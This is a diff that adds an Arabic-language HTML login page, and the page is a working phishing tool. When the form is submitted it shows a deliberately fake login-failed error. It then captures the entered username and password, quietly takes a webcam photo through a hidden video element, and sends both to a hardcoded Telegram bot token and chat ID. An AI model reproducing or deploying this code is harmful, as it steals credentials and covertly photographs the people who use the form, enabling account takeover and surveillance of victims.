@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .container h2 {
+            margin-bottom: 20px;
+        }
+        .container input[type="text"],
+        .container input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .container input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .container input[type="submit"]:hover {
+            background-color: #218838;
+        }
+        .container .message {
+            margin-top: 10px;
+            color: red;
+            display: none;
+        }
+        video {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>تسجيل الدخول</h2>
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="اسم المستخدم" required>
+            <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
+            <input type="submit" value="تسجيل الدخول">
+        </form>
+        <div class="message" id="message">خطأ في اسم المستخدم أو كلمة المرور!</div>
+        <video id="video" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            // إظهار رسالة الخطأ الوهمية فوراً
+            document.getElementById('message').style.color = 'red';
+            document.getElementById('message').textContent = 'خطأ في اسم المستخدم أو كلمة المرور!';
+            document.getElementById('message').style.display = 'block';
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('photo', blob, 'photo.jpg');
+                        formData.append('caption', `تسجيل دخول جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`);
+                        formData.append('chat_id', '6705064304'); // تأكد من صحة chat_id هنا
+
+                        const telegramToken = '7130307203:AAHK4bOGyvlKK6uZGOII-4ZSm_7yJWDbdsw';
+                        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
+
+                        try {
+                            const response = await fetch(telegramUrl, {
+                                method: 'POST',
+                                body: formData
+                            });
+
+                            const data = await response.json();
+                            console.log('Response:', data); // تسجيل الاستجابة للتحقق
+
+                            if (!data.ok) {
+                                document.getElementById('message').textContent = 'فشل في إرسال الصورة: ' + data.description;
+                                document.getElementById('message').style.color = 'red';
+                                document.getElementById('message').style.display = 'block';
+                            }
+
+                        } catch (error) {
+                            document.getElementById('message').textContent = 'حدث خطأ عند إرسال الصورة.';
+                            document.getElementById('message').style.color = 'red';
+                            document.getElementById('message').style.display = 'block';
+                            console.error('Error:', error);
+                        }
+
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 'image/jpeg');
+                }, 2000);
+
+            } catch (error) {
+                document.getElementById('message').textContent = 'فشل في الوصول إلى الكاميرا.';
+                document.getElementById('message').style.color = 'red';
+                document.getElementById('message').style.display = 'block';
+                console.error('Error:', error);
+            }
+        });
+    </script>
+</body>
+</html>
